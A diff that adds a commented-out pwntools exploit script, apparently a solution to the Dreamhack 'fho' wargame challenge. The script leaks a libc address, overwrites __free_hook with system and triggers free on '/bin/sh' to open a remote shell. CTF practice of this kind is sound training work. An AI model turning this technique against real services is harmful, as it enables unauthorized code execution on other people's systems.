@@ -52,3 +52,45 @@ p.interactive()
 |      SFP      |   0x08
 |      RET      |   0x08
 '''
+
+
+# Second try Solution
+# from pwn import *
+
+# # p = process('./fho')
+# p = remote('host1.dreamhack.games', 14144)
+# libc = ELF('./libc-2.27.so')
+# e = ELF('./fho')
+# context.arch = 'amd64'
+# context.endian = 'little'
+
+# # Define slog function
+# def slog(name ,addr): return success(': '.join([name, hex(addr)]))
+
+# # [1] Leak libc address
+# p.sendafter(b'Buf: ', b'A'*0x48)
+# p.recvuntil(b'A'*0x48)
+# ret_of_main = u64(p.recvline()[:-1] + b'\x00'*2)
+# libc_base = ret_of_main - (libc.symbols['__libc_start_main'] + 231)
+
+
+# # [2] Overwrite free_hook with system
+# free_hook = libc_base + libc.symbols['__free_hook']
+# system = libc_base + libc.symbols['system']
+# bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+
+# slog('libc base address', libc_base)
+# slog('free_hook address', free_hook)
+# slog('system address', system)
+# slog('/bin/sh address', bin_sh)
+
+# p.recvuntil(b'To write: ')
+# p.sendline(str(free_hook))
+# p.recvuntil(b'With: ')
+# p.sendline(str(system))
+
+# # [3] Trigger free
+# p.recvuntil(b'To free: ')
+# p.sendline(str(bin_sh))
+
+# p.interactive()
